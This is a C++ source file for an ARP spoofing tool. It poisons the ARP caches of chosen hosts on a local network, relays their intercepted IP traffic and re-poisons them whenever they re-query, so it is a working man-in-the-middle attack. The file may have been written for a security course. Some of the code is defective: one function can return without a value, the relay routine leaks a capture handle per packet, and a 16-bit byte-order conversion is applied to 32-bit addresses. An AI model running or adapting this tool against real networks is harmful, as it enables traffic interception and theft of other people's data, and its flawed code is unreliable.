#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <vector>
#include <map>

#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#include <thread>

#include "pcap_handle.h"
#include "pcap_lib.h"

using namespace std;

void usage() {
	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.3\n");
}

bool is_from_sender(const Eth_header* eth, MAC sender_mac){
	if(!memcmp(&(eth->src_mac), &(sender_mac), 6))
		return true;
	else
		return false;
}

bool is_src_in_sessions(const Eth_header* eth, vector<Session> s, map<uint32_t, MAC> m){
	for(vector<Session>::iterator it = s.begin();
		it != s.end();
		it++)
	{
		if(is_from_sender(eth, m[it->sender_ip])) return true;
	}

	return false;
}

Session find_session(const Eth_header* eth, vector<Session> s, map<uint32_t, MAC> m){
	for(vector<Session>::iterator it = s.begin();
		it != s.end();
		it++)
	{
		if(!memcmp(&m[it->sender_ip], &(eth->src_mac), 6))
			return *it;
	}

	
}

void relay(const char * dev, const IP_header *ip, MAC my_mac, Session s, map<uint32_t, MAC> m){
	
	u_char *packet;
	uint16_t iplen = ntohs(ip->total_len);
	int packet_len = 0xE + iplen;
	packet = (u_char*)malloc(packet_len);

	Eth_header eth;
	eth.src_mac = my_mac;
	eth.dst_mac = m[s.target_ip];
	eth.ether_type = htons(ETHERTYPE_IP);

	memcpy(packet, &eth, 0xE);
	memcpy(packet + 0xE, ip, iplen);

	// send packet (https://blog.pages.kr/290)
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *fp;
	fp = pcap_open_live(dev, 65536, 0, 1000, errbuf);
	//print_packet("relay", packet, packet_len);
	int e=pcap_sendpacket(fp, packet, packet_len);

	free(packet);
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	vector<Session> session_array;
	for(int i = 2; i < argc; i += 2){
		uint32_t sender_ip, target_ip;
		str_to_ip(argv[i], &sender_ip);
		str_to_ip(argv[i+1], &target_ip);
		Session new_session;
		new_session.sender_ip = sender_ip;
		new_session.target_ip = target_ip;
		session_array.push_back(new_session);
	}

	// get my ip and my mac
	uint32_t my_ip;
	MAC my_mac;
	s_getIpAddress (dev, (unsigned char*)&my_ip);
	mac_eth0(dev, (unsigned char*)&my_mac);
	print_IP("my IP", my_ip);
	print_MAC("my MAC", my_mac);

	// collect mac	
	map<uint32_t, MAC> m;
	for(vector<Session>::iterator it = session_array.begin();
  		 it != session_array.end();
  		 it++)
  	{
  		uint32_t ip;
  		MAC mac;

  		for(int i = 0; i < 2; i++){
  			switch(i){
  				case 0: ip = it->sender_ip; break;
  				case 1: ip = it->target_ip; break;
  			}

  			if(m.find(ip) != m.end()) continue;

  			get_mac(dev, handle, my_ip, my_mac, ip, &mac);
  			m[ip] = mac;
			print_IP("IP", ip);
			print_MAC("MAC", mac);
  		}
	}

	thread arp_thread(send_arp_frequently, 10, session_array, m, dev, my_mac);
	arp_thread.detach();

	while(true){
		struct pcap_pkthdr* header;
	    const u_char* packet;
	    int res = pcap_next_ex(handle, &header, &packet);

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

		const Eth_header* eth_pkt = (Eth_header*) packet;

		if(!is_src_in_sessions(eth_pkt, session_array, m))	continue;

		Session cur_session = find_session(eth_pkt, session_array, m);

		if(ntohs(eth_pkt->ether_type) == ETHERTYPE_IP){
			printf("before relay\n");
			const IP_header *ip_pkt = (IP_header *)((u_char*)eth_pkt + 0xE);
			relay(dev, ip_pkt, my_mac, cur_session, m);
			printf("after relay\n");
		}
		else if(ntohs(eth_pkt->ether_type) == ETHERTYPE_ARP){
			printf("before re-infection\n");
			const ARP_header *arp_pkt = (ARP_header *)((u_char*)eth_pkt + 0xE);
			// sender's arp request (before arp table expired)
			if(!(ntohs(arp_pkt->opcode) == ARPOP_REQUEST && ntohs(arp_pkt->target_addr) == my_ip)) continue;
			// target's arp broadcasting
			if(!(!memcmp(&(arp_pkt->sender_mac), &(m[cur_session.sender_ip]), 6) && ntohs(arp_pkt->sender_addr) == cur_session.target_ip)) continue;

			send_arp(dev, my_mac, cur_session.target_ip, m[cur_session.sender_ip], cur_session.sender_ip, ARPOP_REPLY);
			printf("after infection\n");
		}
	}

	pcap_close(handle);
	return 0;
}
